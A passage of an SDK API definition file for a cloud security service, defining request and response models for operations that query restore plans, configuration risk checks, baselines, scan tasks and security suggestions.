  status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **init**: initializing
*   **created**: creating
*   **running**: running
*   **completed**: complete
*   **error**: failed
*   **restoring**: restoring', example='running', position='Query'),
}

model DescribeRestorePlansResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='33'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  restorePlans?: [ 
    {
      createdTime?: long(name='CreatedTime', description='The timestamp when the restoration task was created. Unit: milliseconds.', example='1655174753****'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='Bankup****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the database resides.', example='sql-test-001'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='KtDataBase'),
      restorePoint?: long(name='RestorePoint', description='The point in time to which data is restored.', example='165875100****'),
      status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **init**: initializing
*   **created**: creating
*   **running**: running
*   **completed**: complete
*   **error**: failed
*   **restoring**: restoring', example='running'),
      targetDatabaseName?: string(name='TargetDatabaseName', description='The name of the destination database.', example='OABak'),
      targetInstanceId?: string(name='TargetInstanceId', description='The ID of the destination server.', example='i-2zehqflgbl9ep2he****'),
      targetInstanceName?: string(name='TargetInstanceName', description='The name of the destination server.', example='hbr-detection-hh'),
      updatedTime?: long(name='UpdatedTime', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='166849080****'),
    }
  ](name='RestorePlans', description='An array that consists of the restoration tasks.'),
}

model DescribeRestorePlansResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestorePlansResponseBody(name='body'),
}

async function describeRestorePlans(request: DescribeRestorePlansRequest): DescribeRestorePlansResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRestorePlans', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskCheckItemResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  itemId: long(name='ItemId', description='The ID of the check item.

> For more information about the IDs and details of the check items that can be used in configuration assessment, see [DescribeRiskCheckResult](~~DescribeRiskCheckResult~~).', example='2', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='173.128.XX.XX', position='Query'),
}

model DescribeRiskCheckItemResultResponseBody = {
  pageContentResource?: {
    contentResource?: map[string]any(name='ContentResource', description='The data of the affected assets on each page in a dynamic table.'),
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='3'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageContentResource', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskCheckItemResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckItemResultResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckInstanceResult operation.
  *
 */
// Deprecated
async function describeRiskCheckItemResult(request: DescribeRiskCheckItemResultRequest): DescribeRiskCheckItemResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskCheckItemResult', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskCheckResultRequest {
  assetType?: string(name='AssetType', description='The cloud service whose configuration check results you want to query. For more information about the check items for the cloud service, see the check item table in the "Response parameters" section of this topic.', example='RDS', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  groupId?: long(name='GroupId', description='The type of the check item that you want to query. Valid values:

*   **1**: identity authentication and permissions
*   **2**: network access control
*   **3**: log audit
*   **4**: data security
*   **5**: monitoring and alerting
*   **6**: basic security protection

> If you do not specify this parameter, all types of check items are queried.', example='1', position='Query'),
  itemIds?: [ string ](name='ItemIds', description='An array that consists of the IDs of check items. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: string(name='Name', description='The name of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='ALB_NetWorkAccessControl', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  queryFlag?: string(name='QueryFlag', description='Specifies whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='enabled', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the check item that you want to query. Valid values:

*   **high**
*   **medium**
*   **low**', example='high', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass', position='Query'),
}

model DescribeRiskCheckResultResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      affectedCount?: int32(name='AffectedCount', description='The number of affected assets.', example='0'),
      checkTime?: long(name='CheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1639429164000'),
      itemId?: long(name='ItemId', description='The ID of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='1'),
      remainingTime?: int32(name='RemainingTime', description='The time when the next check will be performed.', example='0'),
      repairStatus?: string(name='RepairStatus', description='Indicates whether the risks that are detected based on the check item can be fixed. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='disabled'),
      riskAssertType?: string(name='RiskAssertType', description='The type of the affected assets.', example='ECS'),
      riskItemResources?: [ 
        {
          contentResource?: map[string]any(name='ContentResource', description='The details about the check results.'),
          resourceName?: string(name='ResourceName', description='The title in the details. Valid values:

*   **bestPractice**: description
*   **influence**: risk
*   **suggestion**: solution
*   **helpResource**: reference', example='bestPractice'),
        }
      ](name='RiskItemResources', description='An array that consists of the details about the check item.'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sort?: int32(name='Sort', description='The sequence number in the check results. The check items are sorted based on the sequence number.', example='1'),
      startStatus?: string(name='StartStatus', description='Indicates whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disable**: no', example='enabled'),
      status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
      taskId?: long(name='TaskId', description='The ID of the check task.', example='15384933'),
      title?: string(name='Title', description='The name of the check item.', example='RDS - Whitelist Configuration'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   Identity authentication and permissions
*   Network access control
*   Log audit
*   Data security
*   Monitoring and alerting
*   Basic security protection', example='Log audit'),
    }
  ](name='List', description='The check items.'),
  pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='20'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AD271C07-4ACE-413D-AA9B-F14FD3B7717F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='12'),
}

model DescribeRiskCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the [ListCheckResult](~~ListCheckResult~~) operation.
  *
 */
// Deprecated
async function describeRiskCheckResult(request: DescribeRiskCheckResultRequest): DescribeRiskCheckResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskCheckResult', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskCheckSummaryRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that is added as a member by using the multi-account control feature.', example='1232428423234****', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model DescribeRiskCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78740F'),
  riskCheckSummary?: {
    affectedAssetCount?: int32(name='AffectedAssetCount', description='The number of affected assets.', example='0'),
    disabledRiskCount?: int32(name='DisabledRiskCount', description='The number of the check items that failed the check.', example='0'),
    enabledRiskCount?: int32(name='EnabledRiskCount', description='The number of the check items that passed the check.', example='3'),
    groups?: [ 
      {
        countByStatus?: [ 
          {
            count?: int32(name='Count', description='The number of detected risk items.', example='2'),
            status?: string(name='Status', description='The status of the check item after the check is finished. Valid values:

*   **pass**: The check item passed the check, which indicates that the check item is normal.
*   **failed**: The check item failed the check, which indicates that risks are detected based on the check item.', example='pass'),
          }
        ](name='CountByStatus', description='An array that consists of the statistics about check results.'),
        id?: long(name='Id', description='The ID of the check item type.', example='1'),
        remainingTime?: int32(name='RemainingTime', description='The remaining time before the check is complete.', example='0'),
        sort?: int32(name='Sort', description='The sequence number of the check item type in the **All Types** drop-down list in the Security Center console.', example='1'),
        status?: string(name='Status', description='The status of the check. Valid values:

*   **finish**: The check is finished.
*   **running**: The check is in progress.
*   **waiting**: The check is pending.
*   **notStart**: The check is not started.', example='finish'),
        title?: string(name='Title', description='The name of the check item type.', example='Identity authentication and permissions'),
      }
    ](name='Groups', description='An array that consists of the statistics for each type of check item.'),
    itemCount?: int32(name='ItemCount', description='The number of check items.', example='4'),
    previousCount?: int32(name='PreviousCount', description='The number of risk items detected in the last check.', example='0'),
    previousTime?: long(name='PreviousTime', description='The timestamp of the last check. Unit: milliseconds.', example='1545012926000'),
    riskCount?: int32(name='RiskCount', description='The number of detected risk items.', example='1'),
    riskLevelCount?: [ 
      {
        count?: int32(name='Count', description='The number of check items at the specified risk level.', example='1'),
        key?: string(name='Key', description='The risk level of the check items. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='RiskLevelCount', description='An array that consists of the number of check items at each risk level.'),
    riskRate?: float(name='RiskRate', description='The proportion of risk items to all check items.', example='0.25'),
  }(name='RiskCheckSummary', description='The summary information about the check results of cloud service configurations.'),
}

model DescribeRiskCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckSummaryResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the GetCheckSummary operation.
  *
 */
// Deprecated
async function describeRiskCheckSummary(request: DescribeRiskCheckSummaryRequest): DescribeRiskCheckSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskCheckSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskItemTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.237.XX.XX', position='Query'),
}

model DescribeRiskItemTypeResponseBody = {
  list?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='37625'),
      title?: string(name='Title', description='The name of the check type.', example='Identity authentication and permissions'),
    }
  ](name='List', description='An array that consists of information about the type of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model DescribeRiskItemTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskItemTypeResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckStandard operation instead.
  *
 */
// Deprecated
async function describeRiskItemType(request: DescribeRiskItemTypeRequest): DescribeRiskItemTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskItemType', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskListCheckResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).

> If you do not specify this parameter, an empty list is returned.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.57.XX.XX', position='Query'),
}

model DescribeRiskListCheckResultResponseBody = {
  list?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud service.', example='rm-bp1e8t4q15sr3****'),
      riskCount?: long(name='riskCount', description='The total number of risk items detected in the current cloud service.', example='3'),
    }
  ](name='List', description='The number of risk items for each cloud service.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskListCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ListCheckResult operation. When you call the ListCheckResult operation, set the Statuses parameter to NOT_PASS.
  *
 */
// Deprecated
async function describeRiskListCheckResult(request: DescribeRiskListCheckResultRequest): DescribeRiskListCheckResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskListCheckResult', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRiskTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  source?: string(name='Source', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X', position='Query'),
}

model DescribeRiskTypeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F22037B5-FCE4-5178-A9E7-71798E1F9270'),
  riskTypes?: [ 
    {
      alias?: string(name='Alias', description='The alias of the baseline type.', example='Redis unauthorized access high exploit vulnerability risk'),
      subTypes?: [ 
        {
          alias?: string(name='Alias', description='The alias of the baseline subtype.', example='Redis unauthorized access high exploit vulnerability risk'),
          checkDetails?: [ 
            {
              checkDesc?: string(name='CheckDesc', description='The description of the baseline.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
              checkId?: long(name='CheckId', description='The ID of the baseline.', example='1299'),
              checkItem?: string(name='CheckItem', description='The baseline.', example='Ensure password expiration period is set.'),
              rules?: [ 
                {
                  optional?: int32(name='Optional', description='Indicates whether the baseline can be edited. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
                  paramList?: [ 
                    {
                      enumValue?: string(name='EnumValue', description='If the value of paramType is 1, this parameter is empty. If the value of paramType is 2, this parameter provides the options that can be selected for paramType.', example='0,1,2,3'),
                      maxValue?: int32(name='MaxValue', description='The maximum value of the parameter.', example='999'),
                      minValue?: int32(name='MinValue', description='The minimum value of the parameter.', example='1'),
                      paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the parameter.', example='7'),
                      paramDesc?: string(name='ParamDesc', description='The description of the parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                      paramName?: string(name='ParamName', description='The name of the parameter.', example='range_val'),
                      paramType?: int32(name='ParamType', description='The configuration type of the parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                    }
                  ](name='ParamList', description='An array that consists of the parameters in the rule for the baseline.'),
                  ruleDesc?: string(name='RuleDesc', description='The description of the rule for the baseline.', example='Please customize the password expiration time detection standard as'),
                  ruleId?: string(name='RuleId', description='The ID of the rule for the baseline.', example='audit.audit_policy.auditpolicychange.cus'),
                }
              ](name='Rules', description='An array that consists of the rule details about the baseline.'),
            }
          ](name='CheckDetails', description='An array that consists of the check details about the baseline subtype.'),
          typeName?: string(name='TypeName', description='The name of the baseline subtype.', example='hc_exploit_redis'),
        }
      ](name='SubTypes', description='An array that consists of the information about baseline subtypes.'),
      typeName?: string(name='TypeName', description='The name of the baseline type.', example='hc_exploit'),
    }
  ](name='RiskTypes', description='An array that consists of the information about baseline types.'),
}

model DescribeRiskTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskTypeResponseBody(name='body'),
}

async function describeRiskType(request: DescribeRiskTypeRequest): DescribeRiskTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRiskType', 'POST', '/', 'json', false, 'json', request);
}

model DescribeRisksRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  limit?: int32(name='Limit', description='The maximum number of entries to return. Default value: 20.', example='10', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  riskId?: long(name='RiskId', description='The baseline ID.

>  You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the baseline IDs.', example='75', position='Query'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='docker', position='Query'),
}

model DescribeRisksResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA54FE21-B006-5DFF-8D64-C4FFECDA****'),
  risks?: [ 
    {
      riskDetail?: string(name='RiskDetail', description='The description of the baseline.', example='Ubuntu 14,Ubuntu 16 ,Ubuntu 18,Ubuntu 20 baseline based on Alibaba Cloud best security practices'),
      riskId?: long(name='RiskId', description='The baseline ID.', example='54'),
      riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      riskType?: string(name='RiskType', description='The name of the baseline type.', example='cis'),
      subRiskType?: string(name='SubRiskType', description='The name of the baseline subtype.', example='hc_ubuntu'),
      subTypeAlias?: string(name='SubTypeAlias', description='The display name of the baseline subtype.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      typeAlias?: string(name='TypeAlias', description='The display name of the baseline type.', example='Best security practices'),
    }
  ](name='Risks', description='The baselines.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeRisksResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRisksResponseBody(name='body'),
}

async function describeRisks(request: DescribeRisksRequest): DescribeRisksResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeRisks', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSasPmAgentListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  uuids: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).', example='inet-cb7ae5ee-b2bc-4581-b616-62495f5d****,inet-37cf0e4f-55cc-4b84-8073-b348b4b4****', position='Query'),
}

model DescribeSasPmAgentListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='8EF3ACC2-9400-5B64-B72D-4A1D35113750'),
  sasPmAgentList?: [ 
    {
      aliyunAssistId?: string(name='AliyunAssistId', description='The ID of Cloud Assistant.', example='mi-hz034jn***yxhc0'),
      aliyunMonitorId?: string(name='AliyunMonitorId', description='The ID of the CloudMonitor agent.', example='5d5ef6be-54ff-11ed-82cf-8f01475e****'),
      assistInstallResult?: int32(name='AssistInstallResult', description='The installation result of Cloud Assistant. Valid values:

*   **0**: SUCCESS
*   **1**: MISSING_PARAM
*   **2**: UNKNOWN_SYSTEM
*   **3**: DOWNLOAD_FAILED
*   **4**: INSTALL_FAILED', example='0'),
      assistInstallStatus?: int32(name='AssistInstallStatus', description='The status of Cloud Assistant. Valid values:

*   **0**: installing
*   **1**: installed
*   **2**: installation failed
*   **3**: installation timed out', example='1'),
      monitorInstallResult?: int32(name='MonitorInstallResult', description='The installation result of the CloudMonitor agent. Valid values:

*   **0**: failed
*   **1**: successful', example='1'),
      monitorInstallStatus?: int32(name='MonitorInstallStatus', description='The status of the CloudMonitor agent. Valid values:

*   **0**: installation failed
*   **1**: installed', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='87f1724d-075e-48d3-95fd-78c2dd36****'),
    }
  ](name='SasPmAgentList', description='An array that consists of the information about servers.'),
}

model DescribeSasPmAgentListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSasPmAgentListResponseBody(name='body'),
}

async function describeSasPmAgentList(request: DescribeSasPmAgentListRequest): DescribeSasPmAgentListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSasPmAgentList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeScanTaskProgressRequest {
  taskId: long(name='TaskId', example='282832', position='Query'),
}

model DescribeScanTaskProgressResponseBody = {
  requestId?: string(name='RequestId', example='EA15BA8A-D631-4375-8D40-CB7C769B0279'),
  scanTaskProgress?: string(name='ScanTaskProgress', example='Success'),
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model DescribeScanTaskProgressResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskProgressResponseBody(name='body'),
}

async function describeScanTaskProgress(request: DescribeScanTaskProgressRequest): DescribeScanTaskProgressResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeScanTaskProgress', 'POST', '/', 'json', false, 'json', request);
}

model DescribeScanTaskStatisticsRequest {
  levels?: string(name='Levels', description='The severities of the alert events handled by the virus detection task. Separate multiple severities with commas (,). The severities decrease in descending order. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious,remind', position='Query'),
}

model DescribeScanTaskStatisticsResponseBody = {
  dealedRiskNum?: int32(name='DealedRiskNum', description='The number of risks that are handled for the user.', example='11'),
  personalTaskNum?: long(name='PersonalTaskNum', description='The total number of tasks that are created for the user.', example='11'),
  requestId?: string(name='RequestId', description='The request ID.', example='765EDBDE-1686-5DBA-B76F-2E0XXXXXXX'),
  totalTaskNum?: long(name='TotalTaskNum', description='The total number of virus detection tasks.', example='11'),
  userNum?: long(name='UserNum', description='The number of risks that are detected for the user.', example='11'),
}

model DescribeScanTaskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskStatisticsResponseBody(name='body'),
}

async function describeScanTaskStatistics(request: DescribeScanTaskStatisticsRequest): DescribeScanTaskStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeScanTaskStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSearchConditionRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', example='117.220.XX.XX', position='Query'),
  type?: string(name='Type', example='ecs', position='Query'),
}

model DescribeSearchConditionResponseBody = {
  conditionList?: [ 
    {
      conditionType?: string(name='ConditionType', example='system'),
      filterConditions?: string(name='FilterConditions', example='{\\"filterParams\\":[{\\"labelKey\\":\\"a|b\\",\\"value\\":\\"{\\\\\\"name\\\\\\":\\\\\\"sadsasd\\\\\\",\\\\\\"value\\\\\\":\\\\\\"dasdsdas\\\\\\"}\\"}],\\"LogicalExp\\":\\"OR\\"}'),
      name?: string(name='Name', example='StopMachine'),
      nameKey?: string(name='NameKey', example='stop_machine'),
    }
  ](name='ConditionList'),
  requestId?: string(name='RequestId', example='3AEC47AF-8CFA-485E-AC9A-3A8ABC06EA7F'),
}

model DescribeSearchConditionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSearchConditionResponseBody(name='body'),
}

async function describeSearchCondition(request: DescribeSearchConditionRequest): DescribeSearchConditionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSearchCondition', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecureSuggestionRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeSecureSuggestionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='676F80E3-4B3F-43DA-9CBB-5FF79F202AA2'),
  suggestions?: [ 
    {
      detail?: [ 
        {
          description?: string(name='Description', description='The description of the suggestion.', example='Malicious tampering of Web pages will affect your normal access to web page content, and may also lead to serious economic losses, brand losses, and even political risks. The webpage tamper-proof service can monitor the website directory in real time and restore the tampered files or directories through backup, so as to ensure that the website information of important systems is not tampered with maliciously and prevent the occurrence of horse hanging, black chain, illegal implantation of terrorist threats, pornography and other content.'),
          subType?: string(name='SubType', description='The sub-type of the unhandled risk. Valid values:

*   **ALARM_HIGH**: Unhandled Urgency Alerts
*   **ALARM_MEDIUM**: Unhandled Warning Alerts
*   **ALARM_LOW**: Unhandled Reminder Alerts
*   **VUL_EMR_UNCHECK**: Unchecked Urgent Vulnerabilities
*   **VUL_EMR_UNFIX**: Unfixed Urgent Vulnerabilities
*   **VUL_WIN**: Unfixed Windows Server Vulnerabilities
*   **VUL_LINUX**: Unfixed Linux Server Vulnerabilities
*   **VUL_CMS**: Unfixed CMS Vulnerabilities
*   **ACCESSKEY_LEAK**: AccessKey Leakage Risks
*   **HC_WARN**: Baseline Risks
*   **HC_WEAK_EXPLOIT_WARN**: There is a risk of weak passwords exposed by the public network.
*   **HC_WEAK_PASSWORD_WARN**: Risk of weak password
*   **HC_HIGH_EXPLOIT_WARN**: There is a high risk of invasion
*   **HC_OTHER_WARN**: Security Configuration risk
*   **HC_DATABASE_WARN**: Database has security risks
*   **CLOUD_HC_SAS_OPEN**: Security protection has not been installed on the server
*   **CLOUD_HC_AEGIS_OFFLINE**: Server protection status is offline
*   **CLOUD_HC_ACCOUNT_DOUBLE_CHECK**: Two-Factor Authentication not Enabled for Primary Account
*   **CLOUD_HC_RDS**: RDS-database security policy failed, security risks
*   **CLOUD_HC_DDOS**: Risks in Anti-DDoS Pro Back-to-Origin Settings
*   **CLOUD_HC_HIGH_LEVEL**: Cloud product configuration has high risk
*   **CLOUD_HC_OTHER_LEVEL**: Cloud product configuration has medium and low risk risks
*   **OTHER_ATTACH**: Attacks
*   **OTHER_DATABASE_ATTACH**: Database has security risks
*   **REINFORCE_BASELINE**: Config Assessment
*   **REINFORCE_SUSPICIOUS**: Antivirus
*   **REINFORCE_ANALYSIS**: Log Analysis
*   **REINFORCE_AK_LEAK**: AccessKey Leaked Intelligence Detection
*   **REINFORCE_WEB_LOCK**: Website tamper-proofing capability not configured
*   **REINFORCE_BRUTE_FORCE**: Anti brute force cracking
*   **REINFORCE_XPRESS_INSTALL**: One-click client installation
*   **REINFORCE_RANSOMWARE**: Enable anti-extortion strategy
*   **REINFORCE_UNI_RANSOMWARE**: Anti-ransomware for Databases
*   **REINFORCE_VIRUS_SCHEDULE_SCAN**: Periodic virus scan policies not configured
*   **REINFORCE_IMAGE_REPO_SCAN**: No container image scan range configured
*   **REINFORCE_IMAGE_SCAN_TASK**: Image security scan
*   **REINFORCE_K8S_LOG_ANALYSIS**: Container K8s threat detection is disabled
*   **REINFORCE_CONTAINER_NETWORK**: Container Visualization', example='REINFORCE_WEB_LOCK'),
          title?: string(name='Title', description='The name of the unhandled risk.', example='Website tamper-proofing capability not configured'),
        }
      ](name='Detail', description='The details of the suggestion.'),
      points?: int32(name='Points', description='The penalty point of a deduction item.', example='40'),
      suggestType?: string(name='SuggestType', description='The type of the unhandled risk. Valid values:

*   **SS_REINFORCE**: missing configuration of key features, such as malicious behavior defense
*   **SS_ALARM**: unhandled alerts
*   **SS_VUL**: unfixed vulnerabilities
*   **SS_HC**: baseline risks
*   **SS_AK**: AccessKey pair leaks
*   **SS_CLOUD_HC**: configuration risks of cloud services
*   **OTHER**: others', example='SS_ALARM'),
    }
